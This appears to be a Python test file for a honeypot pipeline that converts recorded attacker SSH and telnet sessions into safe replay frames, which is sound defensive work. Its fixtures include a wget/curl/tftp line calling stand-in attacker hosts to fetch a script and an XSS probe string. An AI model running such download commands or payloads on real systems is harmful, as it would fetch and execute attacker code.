import json
import unittest
from pathlib import Path

from pipeline import tty

FIXTURES = Path(__file__).parent / "fixtures" / "tty"     # real recordings from the live sensor
EXEC = "4e9fdfe29ef2ada08ab1e29f7b3ef7d297dfa86d002069289e7a7ae21b343904"       # SSH exec
WICKED = "e7b1ccc9952507c48c0e39f4b236bc3dafd794554bb6b1581686d0f8d6a2cd7f"     # telnet, char-by-char echo
HISILICON = "52e9b844cab6d6b643be95b12df186d807af346df86502511b741a6e3c679d57"  # cat /proc/self/exe dump
INFECT = "6c801ce1d313a0644763502c2aa2f60a686b57bca205cb16b1a24c8994e68594"     # loader, many frames


def replay(sha, **meta):
    return tty.to_replay((FIXTURES / sha).read_bytes(), {"sha": sha, **meta})


def text(r):
    return "".join(f[1] for f in r["frames"])


def recording(chunks, start=1_700_000_000.0):
    """[(seconds after start, direction, bytes)] -> ttylog bytes."""
    records = [(tty.OP_OPEN, 0, start, b"")]
    records += [(tty.OP_WRITE, d, start + t, data) for t, d, data in chunks]
    return tty.encode(records + [(tty.OP_CLOSE, 0, start + (chunks[-1][0] if chunks else 0) + 1, b"")])


class RealRecordingTest(unittest.TestCase):
    def test_exec_command_becomes_a_prompt_line(self):
        r = replay(EXEC, session="9213ab38be3f", ip="223.134.89.104", protocol="ssh", duration_ms=520)
        self.assertEqual(r["frames"], [[0.0, "$ ps | grep '[Mm]iner'\r\n"]])
        self.assertEqual((r["id"], r["v"], r["duration"], r["truncated"]), (EXEC[:16], 1, 0.5, False))
        self.assertRegex(r["start"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")

    def test_echo_is_merged_and_output_kept(self):
        r = replay(WICKED)
        out = text(r)
        self.assertIn("default@srv-db01:~$ /bin/busybox WICKED", out)
        self.assertIn("WICKED: applet not found", out)
        self.assertIn("\x1b[4h", out)                         # escape sequences stay for the player
        self.assertLess(len(r["frames"]), 20)                 # 58 output chunks, echoes merged
        times = [f[0] for f in r["frames"]]
        self.assertEqual(times, sorted(times))
        self.assertTrue(all(round(t, 3) == t for t in times))

    def test_binary_dump_is_summarized(self):
        out = text(replay(HISILICON))
        self.assertIn("[binary output, ", out)
        self.assertNotIn("\x00", out)
        self.assertTrue(all(ch.isprintable() or ch in "\n\r\b\t\x1b" for ch in out))

    def test_loader_session(self):
        r = replay(INFECT)
        self.assertIn("echo INFECT_CHECK", text(r))
        self.assertNotIn("http://", text(r))
        json.dumps(r)                                         # serializable as is


class HostileRecordingTest(unittest.TestCase):
    def test_url_typed_char_by_char_is_defanged(self):
        url = "wget http://203.0.113.5/x.sh; curl https://evil.example:8080/a.b; tftp://198.51.100.1"
        chunks = [(i * 0.2, tty.DIR_OUTPUT, ch.encode()) for i, ch in enumerate(url)]
        r = tty.to_replay(recording(chunks), {"sha": "a" * 64})
        out = text(r)
        self.assertIn("hxxp://203[.]0[.]113[.]5/x.sh", out)
        self.assertIn("hxxps://evil[.]example:8080/a.b", out)
        self.assertIn("xfxp://198[.]51[.]100[.]1", out)
        self.assertNotIn("http", out)
        self.assertGreater(len(r["frames"]), 50)              # 200 ms apart: not merged

    def test_controls_markup_and_strings(self):
        data = recording([(0, tty.DIR_OUTPUT, b"<script>alert(1)</script>\x00\x07\x1b]0;owned\x07ok\x1b[31mred\x1b[0m"),
                          (0.001, tty.DIR_OUTPUT, b"\xff\xfe broken utf8 \xe2\x82"),
                          (0.002, tty.DIR_OUTPUT, b"\xac end\r\n"),
                          (1, tty.DIR_INPUT, b"secret input\x00")])
        out = text(tty.to_replay(data, {"sha": "b" * 64}))
        self.assertTrue(out.startswith("<script>alert(1)</script>ok\x1b[31mred"))   # text, never markup
        self.assertNotIn("owned", out)                        # OSC window title dropped
        self.assertIn("€ end", out)                           # multibyte char split across chunks
        self.assertNotIn("secret input", out)                 # raw input is not replayed
        self.assertNotIn("\x00", out)

    def test_size_and_frame_caps(self):
        big = recording([(0, tty.DIR_OUTPUT, b"A" * 200_000)])
        r = tty.to_replay(big, {"sha": "c" * 64})
        self.assertTrue(r["truncated"])
        self.assertEqual(r["frames"][-1][1], tty.TRUNCATED)
        self.assertLessEqual(len(text(r)), tty.MAX_TEXT + len(tty.TRUNCATED))
        many = recording([(i * 0.01, tty.DIR_OUTPUT, b"x") for i in range(6000)])
        r = tty.to_replay(many, {"sha": "d" * 64})
        self.assertTrue(r["truncated"])
        self.assertLessEqual(len(r["frames"]), tty.MAX_FRAMES + 1)

    def test_cut_off_and_garbage_input(self):
        data = recording([(0, tty.DIR_OUTPUT, b"hello"), (0.5, tty.DIR_OUTPUT, b"world")])
        self.assertEqual(text(tty.to_replay(data[:-30], {"sha": "e" * 64})), "hello")
        self.assertEqual(tty.to_replay(b"", {"sha": "f" * 64, "ts": "2026-10-14T07:00:00.5Z"})["frames"], [])
        tty.to_replay(b"\xff" * 1000, {"sha": "f" * 64})
        bad_length = tty.HEADER.pack(tty.OP_WRITE, 0, -5, 2, 0, 0) + b"xyz"
        self.assertEqual(tty.to_replay(bad_length, {"sha": "f" * 64})["frames"], [])

    def test_merge_window(self):
        data = recording([(0, tty.DIR_OUTPUT, b"a"), (0.003, tty.DIR_OUTPUT, b"b"), (0.5, tty.DIR_OUTPUT, b"c")])
        self.assertEqual(tty.to_replay(data, {"sha": "1" * 64})["frames"], [[0.0, "ab"], [0.5, "c"]])

    def test_binary_runs(self):
        def clean(raw):
            return text(tty.to_replay(recording([(0, tty.DIR_OUTPUT, raw)]), {"sha": "2" * 64}))
        self.assertEqual(clean(b"a\x01\x02bcdef" + b"\x00" * 20 + b"g"), "abcdef[binary output, 20 bytes]g")
        # Short printable islands inside a dump belong to the dump.
        self.assertEqual(clean(b"a\x01\x02b" + b"\x00" * 20 + b"c"), "a[binary output, 23 bytes]c")


if __name__ == "__main__":
    unittest.main()
